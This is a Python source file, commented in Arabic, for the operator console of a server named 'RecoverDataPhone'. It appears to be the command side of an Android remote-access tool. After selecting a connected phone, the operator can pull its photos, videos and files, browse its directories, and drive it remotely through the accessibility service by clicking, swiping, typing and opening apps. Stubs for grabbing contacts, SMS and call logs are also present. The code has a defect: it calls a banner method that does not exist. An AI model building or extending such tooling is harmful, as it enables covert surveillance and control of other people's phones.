#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
terminal.py
============================================================
واجهة الطرفية (CLI) للتحكم بالسيرفر والعملاء.

المسؤوليات:
  1. قراءة أوامر المستخدم (async).
  2. تحليلها عبر CommandParser.
  3. تنفيذها عبر SessionManager والمعالجات.
  4. عرض النتائج بشكل جميل.
  5. إدارة العميل المحدد حالياً (current_client).
  6. أوامر إدارة: SESSIONS, AUDIT, RATE, STATS.

يعتمد على:
  - CommandParser (commands/parser.py)
  - SessionManager (core/session_manager.py)
  - RateLimiter (core/rate_limit.py)
  - AuditLogger (core/audit.py)
  - PhotosCommand, VideosCommand, FilesCommand, AccessibilityCommand

الاستخدام:
  cli = TerminalCLI(session_manager)
  await cli.run()
============================================================
"""

import asyncio
import logging
import os
import sys
import time
from datetime import datetime
from typing import Any, Dict, List, Optional

from commands.parser import CommandParser, ParsedCommand
from commands.photos import get_photos_handler
from commands.videos import get_videos_handler
from commands.files import get_files_handler, FilesCommand
from commands.accessibility import get_accessibility_handler, AccessibilityCommand

from core.session_manager import SessionManager
from core.rate_limit import get_rate_limiter, RateLimiter
from core.audit import get_audit_logger, AuditLogger, EventType

from utils.logger import get_logger, format_size, format_duration, truncate

logger = get_logger("terminal")


# ============================================================
# 1. الرموز والألوان (ANSI)
# ============================================================
class C:
    """أكواد الألوان."""
    RESET   = "\033[0m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"
    RED     = "\033[31m"
    GREEN   = "\033[32m"
    YELLOW  = "\033[33m"
    BLUE    = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN    = "\033[36m"
    WHITE   = "\033[37m"


def _supports_color() -> bool:
    """هل الطرفية تدعم الألوان؟"""
    if os.environ.get("NO_COLOR"):
        return False
    if not hasattr(sys.stdout, "isatty"):
        return False
    return sys.stdout.isatty()


USE_COLOR = _supports_color()


def c(text: str, color: str) -> str:
    """تلوين النص إن كانت الطرفية تدعم."""
    if not USE_COLOR:
        return text
    return f"{color}{text}{C.RESET}"


# ============================================================
# 2. TerminalCLI
# ============================================================
class TerminalCLI:
    """
    واجهة الطرفية الرئيسية.
    """

    def __init__(self, session_manager: SessionManager):
        self.session_manager = session_manager

        # المحلّل
        self.parser = CommandParser()

        # المعالجات
        self.photos = get_photos_handler(session_manager)
        self.videos = get_videos_handler(session_manager)
        self.files  = get_files_handler(session_manager)
        self.acc    = get_accessibility_handler(session_manager)

        # أمان
        self.limiter: RateLimiter = get_rate_limiter()
        self.audit: AuditLogger = get_audit_logger()

        # الحالة
        self.running = False
        self.current_client_id: Optional[str] = None

        # سجل الأوامر
        self.history: List[str] = []

        # مهام الخلفية
        self._cleanup_task: Optional[asyncio.Task] = None

        # تسجيل بدء السيرفر
        self.audit.server_start("0.0.0.0", 8765)

    # ========================================================
    # 2.1 دورة الحياة
    # ========================================================
    async def run(self) -> None:
        """حلقة الطرفية الرئيسية."""
        self.running = True

        # رسالة الترحيب
        self._print_banner()

        # مهمة تنظيف دورية
        self._cleanup_task = asyncio.create_task(self._periodic_cleanup())

        try:
            while self.running:
                try:
                    # ----- قراءة الأمر -----
                    prompt = self._build_prompt()
                    line = await self._async_input(prompt)

                    if line is None:  # EOF
                        print()
                        break

                    line = line.strip()
                    if not line:
                        continue

                    # ----- إضافة للسجل -----
                    self.history.append(line)
                    if len(self.history) > 100:
                        self.history.pop(0)

                    # ----- تحليل وتنفيذ -----
                    cmd = self.parser.parse(line)
                    await self._execute(cmd)

                except asyncio.CancelledError:
                    break
                except KeyboardInterrupt:
                    print(f"\n{c('(Ctrl+C) استخدم EXIT للخروج', C.YELLOW)}")
                    continue
                except Exception as e:
                    logger.exception(f"Command loop error: {e}")
                    print(c(f"❌ خطأ: {e}", C.RED))

        finally:
            self.running = False
            await self._shutdown()

    async def _shutdown(self) -> None:
        """إيقاف نظيف."""
        if self._cleanup_task and not self._cleanup_task.done():
            self._cleanup_task.cancel()
            try:
                await self._cleanup_task
            except asyncio.CancelledError:
                pass

        # تسجيل إيقاف السيرفر
        self.audit.server_stop()

        print(c("\n👋 إلى اللقاء!", C.CYAN))

    # ========================================================
    # 2.2 قراءة الإدخال (async)
    # ========================================================
    async def _async_input(self, prompt: str) -> Optional[str]:
        """قراءة سطر بدون تعطيل event loop."""
        loop = asyncio.get_event_loop()
        try:
            return await loop.run_in_executor(None, input, prompt)
        except EOFError:
            return None

    def _build_prompt(self) -> str:
        """بناء نص الـ prompt."""
        if self.current_client_id:
            # اختصار: أول 8 أحرف
            short = self.current_client_id[:8]
            return c(f"[{short}]> ", C.GREEN)
        return c("RDP> ", C.CYAN)

    # ========================================================
    # 2.3 تنفيذ الأمر
    # ========================================================
    async def _execute(self, cmd: ParsedCommand) -> None:
        """توجيه الأمر حسب نوعه."""

        # ----- خطأ في التحليل -----
        if not cmd.valid:
            print(c(f"❌ {cmd.error}", C.RED))
            return

        # ----- التوجيه -----
        name = cmd.name

        try:
            if name == "EXIT":
                self.running = False

            elif name == "CLEAR":
                self._clear_screen()

            elif name == "HELP":
                self._show_help(cmd.args.get("command"))

            elif name == "SESSIONS":
                self._show_sessions()

            elif name == "SELECT":
                self._select_client(cmd.args.get("client_id"))

            elif name == "GET_PHOTOS":
                await self._cmd_get_photos(cmd.args)

            elif name == "GET_VIDEOS":
                await self._cmd_get_videos(cmd.args)

            elif name == "GET_FILE":
                await self._cmd_get_file(cmd.args)

            elif name == "LIST_DIR":
                await self._cmd_list_dir(cmd.args)

            elif name == "ACCESSIBILITY":
                await self._cmd_accessibility(cmd.args)

            elif name == "GET_DEVICE_INFO":
                await self._cmd_device_info()

            elif name == "PING":
                await self._cmd_ping()

            # ----- أوامر جديدة (إدارة) -----
            elif name == "AUDIT":
                await self._cmd_audit(cmd.args)

            elif name == "RATE":
                await self._cmd_rate(cmd.args)

            elif name == "STATS":
                self._cmd_stats()

            elif name in ("STOP", "GET_CONTACTS", "GET_SMS", "GET_CALL_LOGS"):
                print(c(f"⚠️  الأمر {name} غير منفّذ بعد", C.YELLOW))

            else:
                print(c(f"❓ أمر غير معروف: {name}", C.YELLOW))

        except Exception as e:
            logger.exception(f"Execute error for {name}: {e}")
            print(c(f"❌ فشل التنفيذ: {e}", C.RED))

    # ========================================================
    # 2.4 الأوامر: الجلسات
    # ========================================================
    def _show_sessions(self) -> None:
        """عرض الجلسات."""
        sessions = self.session_manager.get_all_sessions()

        if not sessions:
            print(c("📭 لا توجد جلسات متصلة", C.YELLOW))
            return

        print()
        print(c(f"📱 الجلسات المتصلة ({len(sessions)}):", C.BOLD))
        print(c("─" * 80, C.DIM))

        for s in sessions:
            marker = "▶️ " if s.client_id == self.current_client_id else "   "
            status = c("🟢", C.GREEN) if s.is_alive else c("🔴", C.RED)

            device = s.device_info.get("manufacturer", "?")
            model = s.device_info.get("model", "?")
            android = s.device_info.get("android", "?")
            autopilot = "✓" if s.device_info.get("autopilot") else "✗"

            # فحص الحظر
            banned = "🚫" if self.limiter.is_banned(s.client_id) else "  "

            print(
                f"{marker}{status}{banned} "
                f"{c(s.client_id[:8], C.CYAN)}  "
                f"{device} {model}  "
                f"Android {android}  "
                f"AutoPilot: {autopilot}  "
                f"↑{s.messages_sent} ↓{s.messages_received}"
            )

        print()

    def _select_client(self, client_id: Optional[str]) -> None:
        """اختيار عميل."""
        if not client_id:
            print(c("❌ استخدم: SELECT <client_id>", C.RED))
            return

        # إذا كان مختصراً، ابحث بالبادئة
        session = self.session_manager.get_session(client_id)
        if session is None:
            # جرّب البحث بالبادئة
            for s in self.session_manager.get_all_sessions():
                if s.client_id.startswith(client_id):
                    session = s
                    break

        if session is None:
            print(c(f"❌ عميل غير موجود: {client_id}", C.RED))
            return

        self.current_client_id = session.client_id
        print(c(f"✓ تم اختيار العميل: {session.client_id}", C.GREEN))

    def _require_client(self) -> Optional[str]:
        """التأكد من وجود عميل محدد."""
        if not self.current_client_id:
            print(c("❌ لم يتم اختيار عميل. استخدم: SESSIONS ثم SELECT <id>", C.RED))
            return None
        if not self.session_manager.get_session(self.current_client_id):
            print(c(f"❌ العميل انقطع: {self.current_client_id}", C.RED))
            self.current_client_id = None
            return None
        return self.current_client_id

    # ========================================================
    # 2.5 الأوامر: البيانات
    # ========================================================
    async def _cmd_get_photos(self, args: Dict[str, Any]) -> None:
        cid = self._require_client()
        if not cid:
            return

        # فحص الحظر
        if self.limiter.is_banned(cid):
            print(c(f"🚫 العميل محظور: {self.limiter.get_record(cid).ban_remaining}s",
                    C.RED))
            return

        limit = args.get("limit", 0)
        offset = args.get("offset", 0)
        path = args.get("path")

        print(c(f"📸 إرسال GET PHOTOS إلى {cid[:8]}...", C.CYAN))
        ok = await self.photos.execute(cid, limit=limit, offset=offset, path=path)

        if ok:
            print(c("✓ تم الإرسال. الملفات ستُحفظ تدريجياً.", C.GREEN))
            # تسجيل في audit
            self.audit.data_access(cid, "GET_PHOTOS", file_count=limit)
        else:
            print(c("❌ فشل الإرسال", C.RED))

    async def _cmd_get_videos(self, args: Dict[str, Any]) -> None:
        cid = self._require_client()
        if not cid:
            return

        if self.limiter.is_banned(cid):
            print(c(f"🚫 العميل محظور: {self.limiter.get_record(cid).ban_remaining}s",
                    C.RED))
            return

        limit = args.get("limit", 0)
        offset = args.get("offset", 0)
        path = args.get("path")

        print(c(f"🎬 إرسال GET VIDEO إلى {cid[:8]}...", C.CYAN))
        ok = await self.videos.execute(cid, limit=limit, offset=offset, path=path)

        if ok:
            print(c("✓ تم الإرسال. الفيديوهات ستُحفظ تدريجياً.", C.GREEN))
            self.audit.data_access(cid, "GET_VIDEOS", file_count=limit)
        else:
            print(c("❌ فشل الإرسال", C.RED))

    async def _cmd_get_file(self, args: Dict[str, Any]) -> None:
        cid = self._require_client()
        if not cid:
            return

        if self.limiter.is_banned(cid):
            print(c(f"🚫 العميل محظور: {self.limiter.get_record(cid).ban_remaining}s",
                    C.RED))
            return

        path = args.get("path")
        if not path:
            print(c("❌ استخدم: GET FILE <path>", C.RED))
            return

        print(c(f"📄 إرسال GET FILE: {path}", C.CYAN))
        ok = await self.files.execute_get_file(cid, path)

        if ok:
            print(c("✓ تم الإرسال", C.GREEN))
            self.audit.data_access(cid, "GET_FILE", file_count=1)
        else:
            print(c("❌ فشل الإرسال", C.RED))

    async def _cmd_list_dir(self, args: Dict[str, Any]) -> None:
        cid = self._require_client()
        if not cid:
            return

        if self.limiter.is_banned(cid):
            print(c(f"🚫 العميل محظور: {self.limiter.get_record(cid).ban_remaining}s",
                    C.RED))
            return

        path = args.get("path")
        if not path:
            print(c("❌ استخدم: LIST DIR <path>", C.RED))
            return

        print(c(f"📁 عرض: {path}", C.CYAN))
        result = await self.files.execute_list_dir(cid, path)

        if result is None:
            print(c("❌ فشل الطلب أو انتهت المهلة", C.RED))
            return

        print()
        print(FilesCommand.format_list_result(result))
        print()

        self.audit.data_access(cid, "LIST_DIR")

    async def _cmd_device_info(self) -> None:
        cid = self._require_client()
        if not cid:
            return

        session = self.session_manager.get_session(cid)
        if session is None:
            return

        info = session.device_info
        print()
        print(c("📱 معلومات الجهاز:", C.BOLD))
        print(c("─" * 50, C.DIM))
        for key, value in info.items():
            print(f"  {c(key, C.CYAN)}: {value}")
        print()

    async def _cmd_ping(self) -> None:
        cid = self._require_client()
        if not cid:
            return

        session = self.session_manager.get_session(cid)
        if session is None:
            return

        t0 = time.time()
        ok = await session.send_command({"cmd": "PING"})
        elapsed = (time.time() - t0) * 1000

        if ok:
            print(c(f"✓ PING sent ({elapsed:.0f}ms)", C.GREEN))
        else:
            print(c("❌ فشل الإرسال", C.RED))

    # ========================================================
    # 2.6 الأوامر: Accessibility
    # ========================================================
    async def _cmd_accessibility(self, args: Dict[str, Any]) -> None:
        cid = self._require_client()
        if not cid:
            return

        if self.limiter.is_banned(cid):
            print(c(f"🚫 العميل محظور: {self.limiter.get_record(cid).ban_remaining}s",
                    C.RED))
            return

        action = args.pop("action", None)
        if not action:
            print(c("❌ يجب تحديد إجراء", C.RED))
            return

        # تسجيل في audit
        self.audit.accessibility_action(cid, action, args)

        print(c(f"🎮 تنفيذ: {action}...", C.CYAN))

        result = await self.acc.execute(cid, action, args)

        success = result.get("success", False)
        message = result.get("message", "")
        elapsed = result.get("elapsed", 0)

        if success:
            print(c(f"✅ {message} ({elapsed*1000:.0f}ms)", C.GREEN))
        else:
            print(c(f"❌ {message}", C.RED))

        # معالجة خاصة لـ DUMP_UI
        if action == "DUMP_UI" and success:
            await asyncio.sleep(0.8)
            tree = self.acc.get_last_ui_tree(cid)
            if tree:
                print()
                print(AccessibilityCommand.format_ui_tree(tree))
                print()
            else:
                print(c("⚠️  لم يتم استقبال UI tree بعد", C.YELLOW))

        # معالجة خاصة لـ GET_PACKAGE
        if action == "GET_PACKAGE" and success:
            await asyncio.sleep(0.3)
            pkg = self.acc.get_last_package(cid)
            if pkg:
                print(c(f"📦 الحزمة الحالية: {pkg}", C.CYAN))

    # ========================================================
    # 2.7 أوامر جديدة: AUDIT / RATE / STATS
    # ========================================================
    async def _cmd_audit(self, args: Dict[str, Any]) -> None:
        """عرض آخر أحداث التدقيق."""
        # آخر 20 حدث
        entries = self.audit.query(limit=20)

        if not entries:
            print(c("📋 لا توجد أحداث في السجل", C.YELLOW))
            return

        print()
        print(c(f"📋 آخر {len(entries)} حدث:", C.BOLD))
        print(c("─" * 80, C.DIM))

        for e in reversed(entries[-20:]):
            ts = datetime.fromtimestamp(e.timestamp).strftime("%H:%M:%S")
            status = c("✅", C.GREEN) if e.success else c("❌", C.RED)
            client = (e.client_id or "—")[:8]
            msg = truncate(e.message, 50)

            print(f"  {ts} {status} {c(e.event_type, C.CYAN):32} "
                  f"{c(client, C.MAGENTA)}  {msg}")

        # إحصائيات
        stats = self.audit.stats()
        print()
        print(c(f"📊 إجمالي: {stats['total']} حدث، "
                f"{stats['failed']} فشل، "
                f"حجم: {format_size(stats['file_size'])}", C.DIM))
        print()

    async def _cmd_rate(self, args: Dict[str, Any]) -> None:
        """عرض حالة Rate Limit."""
        cid = args.get("client_id") or self.current_client_id

        if cid:
            # حالة عميل محدد
            status = self.limiter.get_client_status(cid)

            if status is None:
                print(c(f"❓ لا يوجد سجل لـ {cid}", C.YELLOW))
                return

            print()
            print(c(f"📊 Rate Limit لـ {cid[:8]}:", C.BOLD))
            print(c("─" * 50, C.DIM))
            print(f"  محظور: {status['is_banned']}")
            if status['is_banned']:
                print(f"  الوقت المتبقي: {status['ban_remaining']}s")
            print(f"  المخالفات: {status['violations']}")
            print(f"  الدلاء:")

            for cat, info in status['buckets'].items():
                bar = "█" * int(info['available'] / info['capacity'] * 20)
                bar += "░" * (20 - len(bar))
                print(f"    {cat:8} [{bar}] "
                      f"{info['available']}/{info['capacity']}")
            print()

        else:
            # إحصائيات عامة
            stats = self.limiter.get_stats()

            print()
            print(c("📊 Rate Limit - نظرة عامة:", C.BOLD))
            print(c("─" * 50, C.DIM))
            print(f"  عملاء متابعون: {stats['tracked_clients']}")
            print(f"  محظورون: {stats['banned_clients']}")
            print(f"  إجمالي الطلبات: {stats['total_requests']}")
            print(f"  مرفوضة: {stats['total_rejected']}")
            print(f"  معدل الرفض: {stats['rejection_rate']}%")

            # قائمة المحظورين
            banned = self.limiter.list_banned()
            if banned:
                print()
                print(c("🚫 محظورون:", C.RED))
                for cid_b in banned:
                    rec = self.limiter.get_record(cid_b)
                    print(f"    {cid_b[:8]} (متبقٍ {rec.ban_remaining}s)")
            print()

    def _cmd_stats(self) -> None:
        """إحصائيات شاملة."""
        print()
        print(c("📊 إحصائيات السيرفر:", C.BOLD))
        print(c("═" * 60, C.DIM))

        # ----- الجلسات -----
        sm_stats = self.session_manager.get_stats()
        print(f"\n  {c('الجلسات:', C.CYAN)}")
        print(f"    إجمالي: {sm_stats['total_sessions']}")
        print(f"    نشطة: {sm_stats['alive_sessions']}")
        print(f"    رسائل مستلمة: {sm_stats['total_messages_received']}")
        print(f"    رسائل مُرسلة: {sm_stats['total_messages_sent']}")

        # ----- Audit -----
        audit_stats = self.audit.stats()
        print(f"\n  {c('التدقيق:', C.CYAN)}")
        print(f"    إجمالي الأحداث: {audit_stats['total']}")
        print(f"    فشل: {audit_stats['failed']}")
        print(f"    حجم السجل: {format_size(audit_stats['file_size'])}")

        # ----- Rate Limit -----
        rl_stats = self.limiter.get_stats()
        print(f"\n  {c('Rate Limit:', C.CYAN)}")
        print(f"    عملاء: {rl_stats['tracked_clients']}")
        print(f"    محظورون: {rl_stats['banned_clients']}")
        print(f"    معدل الرفض: {rl_stats['rejection_rate']}%")

        print()

    # ========================================================
    # 2.8 المساعدة والعرض
    # ========================================================
    def _show_help(self, command: Optional[str]) -> None:
        """عرض المساعدة."""
        if command:
            print(self.parser.help_text(command))
            return

        # مساعدة عامة
        print()
        print(c("╔══════════════════════════════════════════════════════╗", C.CYAN))
        print(c("║           RecoverDataPhone - Command Reference        ║", C.CYAN))
        print(c("╚══════════════════════════════════════════════════════╝", C.CYAN))

        sections = [
            ("📦 البيانات", [
                "GET PHOTOS [--limit N] [--offset N]",
                "GET VIDEO [--limit N]",
                "GET FILE <path>",
                "LIST DIR <path>",
                "INFO",
            ]),
            ("🎮 Accessibility", [
                "ACCESS HOME | BACK | RECENTS",
                "ACCESS CLICK <x> <y>",
                "ACCESS SWIPE <x1> <y1> <x2> <y2>",
                "ACCESS TEXT <text>",
                "ACCESS FIND_CLICK <text>",
                "ACCESS DUMP_UI",
                "ACCESS OPEN_APP <package>",
            ]),
            ("👥 الجلسات", [
                "SESSIONS",
                "SELECT <client_id>",
            ]),
            ("📋 التدقيق والمراقبة", [
                "AUDIT                عرض آخر الأحداث",
                "RATE [client_id]     حالة Rate Limit",
                "STATS                إحصائيات شاملة",
            ]),
            ("💻 الطرفية", [
                "HELP [command]",
                "CLEAR",
                "EXIT",
            ]),
        ]

        for title, commands in sections:
            print()
            print(c(f"  {title}", C.BOLD + C.YELLOW))
            for cmd in commands:
                print(f"    {c(cmd, C.CYAN)}")

        print()
        print(c("  أمثلة:", C.BOLD))
        print(f"    {c('> GET PHOTOS --limit 50', C.DIM)}")
        print(f"    {c('> ACCESS CLICK 540 960', C.DIM)}")
        print(f"    {c('> SELECT a3f8b2c1', C.DIM)}")
        print(f"    {c('> AUDIT', C.DIM)}")
        print()

    def _show_banner(self) -> None:
        """عرض شاشة الترحيب."""
        banner = f"""
{c('╔══════════════════════════════════════════════════════════╗', C.CYAN)}
{c('║', C.CYAN)}      {c('RecoverDataPhone', C.BOLD + C.WHITE)}  {c('Server v1.0.0', C.DIM)}              {c('║', C.CYAN)}
{c('║', C.CYAN)}      {c('Data Recovery & Remote Control', C.DIM)}              {c('║', C.CYAN)}
{c('╚══════════════════════════════════════════════════════════╝', C.CYAN)}

اكتب {c('HELP', C.YELLOW)} لعرض الأوامر، أو {c('EXIT', C.YELLOW)} للخروج.

الميزات الجديدة:
  • {c('AUDIT', C.CYAN)}   — سجل التدقيق
  • {c('RATE', C.CYAN)}    — حالة Rate Limit
  • {c('STATS', C.CYAN)}   — إحصائيات شاملة
"""
        print(banner)

    def _clear_screen(self) -> None:
        """مسح الشاشة."""
        os.system("cls" if os.name == "nt" else "clear")

    # ========================================================
    # 2.9 مهمة التنظيف الدورية
    # ========================================================
    async def _periodic_cleanup(self) -> None:
        """تنظيف دوري كل 60 ثانية."""
        while self.running:
            try:
                await asyncio.sleep(60)
                if not self.running:
                    break

                # تنظيف المعالجات
                removed_p = await self.photos.cleanup_stale()
                removed_v = await self.videos.cleanup_stale()
                removed_f = await self.files.cleanup_stale()

                total = removed_p + removed_v + removed_f
                if total > 0:
                    logger.info(f"Periodic cleanup: removed {total} stale items")

                # تنظيف Audit (كل ساعة)
                if int(time.time()) % 3600 < 60:
                    self.audit.cleanup_old()

            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.exception(f"Cleanup error: {e}")


# ============================================================
# 3. دالة مساعدة للتشغيل المستقل
# ============================================================
async def run_cli_standalone() -> None:
    """
    تشغيل الطرفية وحدها (بدون خادم).
    مفيد للاختبار.
    """
    from core.session_manager import SessionManager
    from utils.logger import setup_logger

    setup_logger(level="INFO")

    sm = SessionManager()
    cli = TerminalCLI(sm)
    await cli.run()


if __name__ == "__main__":
    try:
        asyncio.run(run_cli_standalone())
    except KeyboardInterrupt:
        print("\n[!] Interrupted")